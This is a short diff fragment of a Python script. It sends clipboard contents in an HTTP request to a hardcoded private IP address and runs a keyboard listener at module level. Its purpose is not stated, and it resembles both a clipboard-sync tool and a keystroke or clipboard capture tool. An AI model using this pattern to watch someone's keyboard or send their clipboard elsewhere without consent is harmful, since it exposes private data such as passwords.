@@ -33,11 +33,8 @@ def post():
     post = requests.get(f'http://192.168.128.241:5000/post?content={clipboard_value}')
     return clipboard_value
 
-def main():
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-if __name__ == '__main__':
-    main()
+print(fetch())
 
